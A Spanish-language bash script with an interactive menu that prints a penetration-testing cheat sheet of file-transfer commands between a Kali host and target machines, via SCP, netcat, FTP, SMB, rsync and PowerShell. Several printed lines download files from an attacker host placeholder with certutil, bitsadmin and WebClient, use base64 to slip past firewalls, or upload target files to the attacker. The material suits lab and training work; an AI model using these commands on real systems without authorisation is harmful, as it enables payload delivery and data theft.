#!/bin/bash

# Colores para el menú
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Variables globales para los campos comunes
TARGET_IP=""
TARGET_DOMAIN=""
USERNAME=""
PASSWORD=""
LOCAL_FILE=""
REMOTE_FILE=""
PORT=""

# Función para solicitar y validar IP
get_target_ip() {
    while true; do
        echo -n "Ingrese la IP objetivo (ej: 192.168.1.100): "
        read -r TARGET_IP
        if [[ $TARGET_IP =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
            IFS='.' read -r -a ip_parts <<< "$TARGET_IP"
            valid=true
            for part in "${ip_parts[@]}"; do
                if [ "$part" -gt 255 ] || [ "$part" -lt 0 ]; then
                    valid=false
                    break
                fi
            done
            if [ "$valid" = true ]; then
                break
            fi
        fi
        echo -e "${RED}IP inválida. Por favor, ingrese una IP válida.${NC}"
        echo -e "${YELLOW}Ejemplos válidos:${NC}"
        echo "- 192.168.1.100"
        echo "- 10.0.0.1"
        echo "- 172.16.0.1"
    done
}

# Función para solicitar y validar dominio
get_target_domain() {
    while true; do
        echo -n "Ingrese el dominio objetivo (ej: ejemplo.com o sub.ejemplo.com): "
        read -r TARGET_DOMAIN
        if [[ $TARGET_DOMAIN =~ ^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9](\.[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9])*\.[a-zA-Z]{2,}$ ]]; then
            break
        fi
        echo -e "${RED}Dominio inválido. Por favor, ingrese un dominio válido.${NC}"
        echo -e "${YELLOW}Ejemplos válidos:${NC}"
        echo "- ejemplo.com"
        echo "- sub.ejemplo.com"
        echo "- dominio.org"
        echo "- sub1.sub2.ejemplo.com"
    done
}

# Función para solicitar credenciales
get_credentials() {
    while true; do
        echo -n "Ingrese el nombre de usuario: "
        read -r USERNAME
        if [[ $USERNAME =~ ^[a-zA-Z0-9_\-\.]+$ ]]; then
            break
        fi
        echo -e "${RED}Nombre de usuario inválido. Por favor, use solo letras, números, guiones y puntos.${NC}"
    done

    while true; do
        echo -n "Ingrese la contraseña: "
        read -rs PASSWORD
        echo
        if [ -n "$PASSWORD" ]; then
            break
        fi
        echo -e "${RED}La contraseña no puede estar vacía.${NC}"
    done
}

# Función para solicitar archivos
get_files() {
    while true; do
        echo -n "Ingrese la ruta del archivo local: "
        read -r LOCAL_FILE
        if [ -f "$LOCAL_FILE" ]; then
            break
        fi
        echo -e "${RED}Archivo no encontrado. Por favor, ingrese una ruta válida.${NC}"
        echo -e "${YELLOW}Ejemplos válidos:${NC}"
        echo "- /ruta/al/archivo.txt"
        echo "- C:\\Windows\\Temp\\archivo.exe"
        echo "- ./archivo.sh"
    done

    while true; do
        echo -n "Ingrese la ruta del archivo remoto: "
        read -r REMOTE_FILE
        # Validación más flexible para rutas
        if [[ $REMOTE_FILE =~ ^[a-zA-Z0-9_\-\.\/\\:]+$ ]] || \
           [[ $REMOTE_FILE =~ ^[a-zA-Z]:[\/\\][a-zA-Z0-9_\-\.\/\\]+$ ]] || \
           [[ $REMOTE_FILE =~ ^[\/\\][a-zA-Z0-9_\-\.\/\\]+$ ]] || \
           [[ $REMOTE_FILE =~ ^[a-zA-Z0-9_\-\.\/\\]+$ ]]; then
            break
        fi
        echo -e "${RED}Ruta inválida. Por favor, ingrese una ruta válida.${NC}"
        echo -e "${YELLOW}Ejemplos válidos:${NC}"
        echo "- /tmp/archivo.txt"
        echo "- C:\\Windows\\Temp\\archivo.exe"
        echo "- ./archivo.sh"
        echo "- /home/kali/archivo.sh"
        echo "- archivo.txt"
    done
}

# Función para solicitar puerto
get_port() {
    while true; do
        echo -n "Ingrese el puerto (1-65535): "
        read -r PORT
        if [[ $PORT =~ ^[0-9]+$ ]] && [ "$PORT" -ge 1 ] && [ "$PORT" -le 65535 ]; then
            break
        fi
        echo -e "${RED}Puerto inválido. Por favor, ingrese un puerto válido.${NC}"
        echo -e "${YELLOW}Ejemplos válidos:${NC}"
        echo "- 80 (HTTP)"
        echo "- 443 (HTTPS)"
        echo "- 445 (SMB)"
        echo "- 22 (SSH)"
        echo "- 21 (FTP)"
    done
}

# Función para solicitar URL
get_url() {
    while true; do
        echo -n "Ingrese la URL (ej: http://ejemplo.com o http://192.168.1.100): "
        read -r TARGET_URL
        # Validación más flexible que acepta IPs y dominios
        if [[ $TARGET_URL =~ ^https?://[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9](\.[a-zA-Z]{2,})?(\.[a-zA-Z]{2,})?(:[0-9]+)?(/.*)?$ ]] || \
           [[ $TARGET_URL =~ ^https?://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}(:[0-9]+)?(/.*)?$ ]]; then
            break
        fi
        echo -e "${RED}URL inválida. Por favor, ingrese una URL válida.${NC}"
        echo -e "${YELLOW}Ejemplos válidos:${NC}"
        echo "- http://ejemplo.com"
        echo "- http://192.168.1.100"
        echo "- http://ejemplo.com:8080"
        echo "- http://192.168.1.100:8000"
        echo "- http://sub.ejemplo.com"
    done
}

# Función para mostrar el menú principal
show_menu() {
    clear
    echo -e "${BLUE}=== Transferencia de archivos ===${NC}"
    echo -e "${YELLOW}Seleccione el sistema operativo de origen:${NC}"
    echo -e "${GREEN}1.${NC} Desde Kali Linux"
    echo -e "${GREEN}2.${NC} Desde Windows"
    echo -e "${GREEN}3.${NC} Salir"
    echo
    echo -e "${YELLOW}Redes:${NC}"
    echo -e "${GREEN}LinkedIn:${NC} www.linkedin.com/in/axel-tear"
    echo -e "${GREEN}GitHub:${NC} github.com/oliverexx/"
    echo
    echo -n "Seleccione una opción: "
}

# Función para mostrar el menú de Kali Linux
show_kali_menu() {
    clear
    echo -e "${BLUE}=== Transferencia desde Kali Linux ===${NC}"
    echo -e "${YELLOW}Seleccione el método de transferencia:${NC}"
    echo -e "${GREEN}1.${NC} SCP (requiere SSH)"
    echo -e "${GREEN}2.${NC} Python HTTP Server"
    echo -e "${GREEN}3.${NC} Netcat"
    echo -e "${GREEN}4.${NC} FTP"
    echo -e "${GREEN}5.${NC} SMB (usando impacket-smbserver)"
    echo -e "${GREEN}6.${NC} Rsync - Linux"
    echo -e "${GREEN}7.${NC} Volver al menú principal"
    echo
    echo -n "Seleccione una opción: "
}

# Función para mostrar el menú de Windows
show_windows_menu() {
    clear
    echo -e "${BLUE}=== Transferencia desde Windows ===${NC}"
    echo -e "${YELLOW}Seleccione el método de transferencia:${NC}"
    echo -e "${GREEN}1.${NC} PowerShell Web Downloads"
    echo -e "${GREEN}2.${NC} SMB Shares"
    echo -e "${GREEN}3.${NC} FTP"
    echo -e "${GREEN}4.${NC} Volver al menú principal"
    echo
    echo -n "Seleccione una opción: "
}

# Función para SCP
implement_scp() {
    echo -e "${BLUE}=== SCP Transfers ===${NC}"
    
    echo -e "${YELLOW}¿Qué es SCP?${NC}"
    echo "Método seguro para transferir archivos entre hosts usando SSH."
    echo

    echo -e "${GREEN}1. Configuración del servidor (máquina destino):${NC}"
    echo -e "${YELLOW}En Windows:${NC}"
    echo "1. Instalar OpenSSH Server:"
    echo "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"
    echo
    echo "2. Iniciar y habilitar el servicio:"
    echo "Start-Service sshd"
    echo "Set-Service -Name sshd -StartupType 'Automatic'"
    echo
    echo "3. Verificar que el servicio está corriendo:"
    echo "Get-Service sshd"
    echo
    echo -e "${YELLOW}En Linux:${NC}"
    echo "1. Instalar OpenSSH Server:"
    echo "sudo apt-get update"
    echo "sudo apt-get install openssh-server"
    echo
    echo "2. Iniciar y habilitar el servicio:"
    echo "sudo systemctl start ssh"
    echo "sudo systemctl enable ssh"
    echo
    echo "3. Verificar que el servicio está corriendo:"
    echo "sudo systemctl status ssh"
    echo

    echo -e "${GREEN}2. Comandos para la máquina origen:${NC}"
    echo -e "${YELLOW}En Linux:${NC}"
    echo "1. Subir archivo a Windows:"
    echo "scp -P 22 archivo.exe <USERNAME>@<IP-DESTINO>:C:\\Windows\\Temp\\archivo.exe"
    echo
    echo "2. Subir archivo a Linux:"
    echo "scp -P 22 archivo.sh <USERNAME>@<IP-DESTINO>:/tmp/archivo.sh"
    echo
    echo "3. Subir directorio:"
    echo "scp -r -P 22 directorio/ <USERNAME>@<IP-DESTINO>:/tmp/directorio/"
    echo
    echo "4. Descargar archivo:"
    echo "scp -P 22 <USERNAME>@<IP-DESTINO>:/ruta/archivo.sh /tmp/archivo.sh"
}

# Función para Python HTTP Server
implement_python() {
    echo -e "${BLUE}=== Python HTTP Server ===${NC}"
    
    echo -e "${YELLOW}¿Qué es Python HTTP Server?${NC}"
    echo "Servidor web simple para compartir archivos a través de HTTP/HTTPS."
    echo

    echo -e "${GREEN}1. Configuración del servidor (Kali Linux):${NC}"
    echo -e "${YELLOW}Servidor básico:${NC}"
    echo "sudo python3 -m http.server 8000"
    echo
    echo -e "${YELLOW}Servidor con autenticación:${NC}"
    echo "sudo pip3 install http-auth"
    echo
    echo "sudo python3 -c 'from http.server import HTTPServer, SimpleHTTPRequestHandler; import htdigest; htdigest.htdigest(\"passwd\", \"Realm\", \"<USERNAME>\", \"<PASSWORD>\"); HTTPServer((\"0.0.0.0\", 8000), SimpleHTTPRequestHandler).serve_forever()'"
    echo

    echo -e "${GREEN}2. Comandos para la máquina objetivo:${NC}"
    echo -e "${YELLOW}En Windows:${NC}"
    echo "1. Usando WebClient:"
    echo '(New-Object Net.WebClient).DownloadFile("http://<IP-ATK>:8000/archivo.exe", "C:\\Windows\\Temp\\archivo.exe")'
    echo
    echo "2. Usando Invoke-WebRequest:"
    echo 'Invoke-WebRequest -Uri "http://<IP-ATK>:8000/archivo.exe" -OutFile "C:\\Windows\\Temp\\archivo.exe"'
    echo
    echo "3. Usando certutil:"
    echo "certutil.exe -urlcache -split -f http://<IP-ATK>:8000/archivo.exe C:\\Windows\\Temp\\archivo.exe"
    echo
    echo "4. Usando Base64 (útil si el firewall bloquea binarios):"
    echo "# En Kali:"
    echo "base64 archivo.exe > archivo.exe.b64"
    echo "# En Windows:"
    echo '$base64 = (Invoke-WebRequest -Uri "http://<IP-ATK>:8000/archivo.exe.b64").Content'
    echo '$bytes = [Convert]::FromBase64String($base64)'
    echo '[IO.File]::WriteAllBytes("C:\\Windows\\Temp\\archivo.exe", $bytes)'
    echo
    echo -e "${YELLOW}En Linux:${NC}"
    echo "1. Usando wget:"
    echo "wget http://<IP-ATK>:8000/archivo.sh -O /tmp/archivo.sh"
    echo
    echo "2. Usando curl:"
    echo "curl http://<IP-ATK>:8000/archivo.sh -o /tmp/archivo.sh"
    echo
    echo "3. Usando Python:"
    echo "python3 -c 'import urllib.request; urllib.request.urlretrieve(\"http://<IP-ATK>:8000/archivo.sh\", \"/tmp/archivo.sh\")'"
    echo
    echo "4. Usando Base64 (útil si el firewall bloquea binarios):"
    echo "# En Kali:"
    echo "base64 archivo.sh > archivo.sh.b64"
    echo "# En Linux objetivo:"
    echo "curl http://<IP-ATK>:8000/archivo.sh.b64 | base64 -d > /tmp/archivo.sh"
}

# Función para SMB Transfers
implement_smb_transfers() {
    echo -e "${BLUE}=== SMB Transfers ===${NC}"
    
    echo -e "${YELLOW}¿Qué es SMB?${NC}"
    echo "Protocolo común en redes Windows para compartir archivos y recursos."
    echo

    echo -e "${GREEN}1. Configuración del servidor (Kali Linux):${NC}"
    echo "1. Instalar impacket-smbserver:"
    echo "sudo pip3 install impacket"
    echo
    echo "2. Crear directorio para compartir:"
    echo "sudo mkdir -p /tmp/smbshare"
    echo "sudo chmod 777 /tmp/smbshare"
    echo
    echo "3. Iniciar el servidor SMB:"
    echo "sudo impacket-smbserver share -smb2support /tmp/smbshare"
    echo
    echo "4. Alternativa con autenticación:"
    echo "sudo impacket-smbserver share -smb2support /tmp/smbshare -user <USERNAME> -password <PASSWORD>"
    echo

    echo -e "${GREEN}2. Comandos para la máquina objetivo:${NC}"
    echo -e "${YELLOW}En Windows:${NC}"
    echo "1. Descargar archivo desde Kali:"
    echo "copy \\\\<IP-KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
    echo
    echo "2. Subir archivo a Kali:"
    echo "copy C:\\Windows\\Temp\\archivo.exe \\\\<IP-KALI>\\share\\archivo.exe"
    echo
    echo "3. Con autenticación:"
    echo "net use n: \\\\<IP-KALI>\\share /user:<USERNAME> <PASSWORD>"
    echo "copy C:\\Windows\\Temp\\archivo.exe n:\\archivo.exe"
    echo "net use n: /delete"
    echo
    echo "4. Usando PowerShell:"
    echo "Copy-Item -Path 'C:\\Windows\\Temp\\archivo.exe' -Destination '\\\\<IP-KALI>\\share\\archivo.exe'"
    echo
    echo -e "${YELLOW}En Linux:${NC}"
    echo "1. Instalar cifs-utils:"
    echo "sudo apt-get install cifs-utils"
    echo
    echo "2. Montar el share:"
    echo "sudo mkdir -p /mnt/smb_share"
    echo "sudo mount -t cifs //<IP-KALI>/share /mnt/smb_share -o username=<USERNAME>,password=<PASSWORD>"
    echo
    echo "3. Copiar archivos:"
    echo "cp /mnt/smb_share/archivo.sh /tmp/archivo.sh"
    echo
    echo "4. Desmontar el share:"
    echo "sudo umount /mnt/smb_share"
}

# Función para Netcat
implement_netcat() {
    echo -e "${BLUE}=== Transferencia con Netcat ===${NC}"
    
    echo -e "${YELLOW}¿Qué es Netcat?${NC}"
    echo "Herramienta de red para transferir archivos a través de TCP/UDP."
    echo

    echo -e "${GREEN}1. Configuración del servidor (máquina destino):${NC}"
    echo -e "${YELLOW}En Linux:${NC}"
    echo "nc -l -p 1234 > file.sh"
    echo
    echo -e "${YELLOW}En Windows:${NC}"
    echo "nc -l -p 1234 > file.exe"
    echo

    echo -e "${GREEN}2. Comandos para la máquina origen:${NC}"
    echo -e "${YELLOW}En Linux:${NC}"
    echo "nc <IP-DESTINO> 1234 < file.sh"
    echo
    echo -e "${YELLOW}En Windows:${NC}"
    echo "nc <IP-DESTINO> 1234 < file.exe"
    echo

    echo -e "${YELLOW}Transferencia encriptada (con cryptcat):${NC}"
    echo -e "${GREEN}1. Configuración del servidor (máquina destino):${NC}"
    echo "cryptcat -l -p 1234 > file.sh"
    echo
    echo -e "${GREEN}2. Comandos para la máquina origen:${NC}"
    echo "cryptcat <IP-DESTINO> 1234 < file.sh"
}

# Función para FTP Transfers
implement_ftp_transfers() {
    echo -e "${BLUE}=== FTP Transfers ===${NC}"
    
    echo -e "${YELLOW}¿Qué es FTP?${NC}"
    echo "Protocolo estándar para transferencia de archivos entre sistemas."
    echo

    echo -e "${GREEN}1. Configuración del servidor (Kali Linux):${NC}"
    echo "1. Instalar pyftpdlib:"
    echo "sudo pip3 install pyftpdlib"
    echo
    echo "2. Iniciar servidor FTP básico:"
    echo "sudo python3 -m pyftpdlib -p 21 -w"
    echo
    echo "3. Iniciar servidor FTP con autenticación:"
    echo "sudo python3 -m pyftpdlib -p 21 -w -u <USERNAME> -P <PASSWORD>"
    echo

    echo -e "${GREEN}2. Comandos para la máquina objetivo:${NC}"
    echo -e "${YELLOW}En Windows:${NC}"
    echo "1. Descargar archivo desde Kali:"
    echo '$ftp = "ftp://<USERNAME>:<PASSWORD>@<IP-KALI>/archivo.exe"'
    echo '$webclient = New-Object System.Net.WebClient'
    echo '$webclient.DownloadFile($ftp, "C:\\Windows\\Temp\\archivo.exe")'
    echo
    echo "2. Subir archivo a Kali:"
    echo '$ftp = "ftp://<USERNAME>:<PASSWORD>@<IP-KALI>/"'
    echo '$webclient = New-Object System.Net.WebClient'
    echo '$webclient.UploadFile($ftp, "C:\\Windows\\Temp\\archivo.exe")'
    echo
    echo "3. Usando comando FTP interactivo:"
    echo "ftp <IP-KALI>"
    echo "Username: <USERNAME>"
    echo "Password: <PASSWORD>"
    echo "put C:\\Windows\\Temp\\archivo.exe"
    echo "bye"
    echo
    echo "4. Usando script FTP automático:"
    echo "echo open <IP-KALI> > ftp.txt"
    echo "echo <USERNAME> >> ftp.txt"
    echo "echo <PASSWORD> >> ftp.txt"
    echo "echo put C:\\Windows\\Temp\\archivo.exe >> ftp.txt"
    echo "echo bye >> ftp.txt"
    echo "ftp -s:ftp.txt"
    echo
    echo "5. Usando Base64 (útil si el firewall bloquea binarios):"
    echo "# En Windows:"
    echo '$content = Get-Content -Path "C:\Windows\Temp\archivo.exe" -Encoding Byte'
    echo '$base64 = [Convert]::ToBase64String($content)'
    echo '$base64 | Out-File -FilePath "C:\Windows\Temp\archivo.exe.b64"'
    echo "# Subir el archivo .b64 y decodificar en Kali:"
    echo "base64 -d archivo.exe.b64 > archivo.exe"
    echo
    echo -e "${YELLOW}En Linux:${NC}"
    echo "1. Usando wget:"
    echo "wget ftp://<USERNAME>:<PASSWORD>@<IP-KALI>/archivo.sh -O /tmp/archivo.sh"
    echo
    echo "2. Usando curl:"
    echo "curl -u <USERNAME>:<PASSWORD> ftp://<IP-KALI>/archivo.sh -o /tmp/archivo.sh"
    echo
    echo "3. Usando comando FTP interactivo:"
    echo "ftp <IP-KALI>"
    echo "Username: <USERNAME>"
    echo "Password: <PASSWORD>"
    echo "get archivo.sh"
    echo "bye"
    echo
    echo "4. Usando Base64 (útil si el firewall bloquea binarios):"
    echo "# En Linux:"
    echo "base64 archivo.sh > archivo.sh.b64"
    echo "# Subir el archivo .b64 por FTP y decodificar en Kali:"
    echo "base64 -d archivo.sh.b64 > archivo.sh"
}

# Función para PowerShell Web Downloads
implement_powershell_web_downloads() {
    echo -e "${BLUE}=== PowerShell Web Downloads ===${NC}"
    
    echo -e "${YELLOW}¿Qué es PowerShell Web Downloads?${NC}"
    echo "Método para descargar archivos usando PowerShell."
    echo

    echo -e "${GREEN}1. Descargar archivos desde Windows a Kali:${NC}"
    echo "1. Usando Invoke-WebRequest:"
    echo 'Invoke-WebRequest -Uri "http://<IP-KALI>:8000/archivo.exe" -OutFile "C:\Windows\Temp\archivo.exe"'
    echo
    echo "2. Usando WebClient:"
    echo '(New-Object Net.WebClient).DownloadFile("http://<IP-KALI>:8000/archivo.exe", "C:\Windows\Temp\archivo.exe")'
    echo
    echo "3. Usando certutil:"
    echo "certutil.exe -urlcache -split -f http://<IP-KALI>:8000/archivo.exe C:\Windows\Temp\archivo.exe"
    echo
    echo "4. Usando bitsadmin:"
    echo "bitsadmin /transfer job /download /priority normal http://<IP-KALI>:8000/archivo.exe C:\Windows\Temp\archivo.exe"
    echo
    echo "5. Usando Base64 (útil si el firewall bloquea binarios):"
    echo '# En Kali:'
    echo "base64 archivo.exe > archivo.exe.b64"
    echo '# En Windows:'
    echo '$base64 = (Invoke-WebRequest -Uri "http://<IP-KALI>:8000/archivo.exe.b64").Content'
    echo '$bytes = [Convert]::FromBase64String($base64)'
    echo '[IO.File]::WriteAllBytes("C:\Windows\Temp\archivo.exe", $bytes)'
    echo
    echo -e "${GREEN}2. Subir archivos desde Windows a Kali:${NC}"
    echo "1. Usando PowerShell para subir a servidor web:"
    echo '$file = "C:\Windows\Temp\archivo.exe"'
    echo '$url = "http://<IP-KALI>:8000/upload"'
    echo '$webClient = New-Object System.Net.WebClient'
    echo '$webClient.UploadFile($url, $file)'
    echo
    echo "2. Usando FTP desde PowerShell:"
    echo '$ftp = "ftp://<USERNAME>:<PASSWORD>@<IP-KALI>/archivo.exe"'
    echo '$webclient = New-Object System.Net.WebClient'
    echo '$webclient.UploadFile($ftp, "C:\Windows\Temp\archivo.exe")'
    echo
    echo "3. Usando SMB desde PowerShell:"
    echo "Copy-Item -Path 'C:\Windows\Temp\archivo.exe' -Destination '\\\\<IP-KALI>\\share\\archivo.exe'"
    echo
    echo "4. Usando Base64 (útil si el firewall bloquea binarios):"
    echo '# En Windows:'
    echo '$content = Get-Content -Path "C:\Windows\Temp\archivo.exe" -Encoding Byte'
    echo '$base64 = [Convert]::ToBase64String($content)'
    echo '$base64 | Out-File -FilePath "C:\Windows\Temp\archivo.exe.b64"'
    echo '# Subir el archivo .b64 y decodificar en Kali:'
    echo "base64 -d archivo.exe.b64 > archivo.exe"
}

# Función para implementar Kali → Kali con Rsync
implement_kali_to_kali_rsync() {
    echo -e "${BLUE}=== Transferencia con Rsync ===${NC}"
    
    echo -e "${YELLOW}¿Qué es Rsync?${NC}"
    echo "Herramienta para sincronización y transferencia eficiente de archivos."
    echo

    echo -e "${GREEN}1. Configuración del servidor (máquina destino):${NC}"
    echo -e "${YELLOW}En Linux:${NC}"
    echo "sudo apt-get install rsync"
    echo
    echo "sudo systemctl start rsync"
    echo "sudo systemctl enable rsync"
    echo
    echo "sudo nano /etc/rsyncd.conf"
    echo "[module]"
    echo "path = /tmp/rsync"
    echo "read only = no"
    echo "list = yes"
    echo "uid = nobody"
    echo "gid = nogroup"
    echo
    echo "sudo mkdir -p /tmp/rsync"
    echo "sudo chmod 777 /tmp/rsync"
    echo "rsync --daemon --config=/etc/rsyncd.conf"
    echo

    echo -e "${GREEN}2. Comandos para la máquina origen:${NC}"
    echo -e "${YELLOW}En Linux:${NC}"
    echo "rsync -avz archivo.sh <IP-DESTINO>::module/"
    echo
    echo -e "${YELLOW}Alternativa con SSH:${NC}"
    echo "rsync -avz -e ssh archivo.sh usuario@<IP-DESTINO>:/ruta/destino/"
}

# Bucle principal
while true; do
    show_menu
    read -r option

    case $option in
        1)
            while true; do
                show_kali_menu
                read -r kali_option

                case $kali_option in
                    1) implement_scp ;;
                    2) implement_python ;;
                    3) implement_netcat ;;
                    4) implement_ftp_transfers ;;
                    5) implement_smb_transfers ;;
                    6) implement_kali_to_kali_rsync ;;
                    7) break ;;
                    *) echo -e "${RED}Opción inválida${NC}" ;;
                esac

                echo
                read -p "Presione Enter para continuar..."
            done
            ;;
        2)
            while true; do
                show_windows_menu
                read -r windows_option

                case $windows_option in
                    1) implement_powershell_web_downloads ;;
                    2) implement_smb_transfers ;;
                    3) implement_ftp_transfers ;;
                    4) break ;;
                    *) echo -e "${RED}Opción inválida${NC}" ;;
                esac

                echo
                read -p "Presione Enter para continuar..."
            done
            ;;
        3)
            echo -e "${GREEN}Saliendo...${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}Opción inválida${NC}" ;;
    esac

    echo
    read -p "Presione Enter para continuar..."
done 
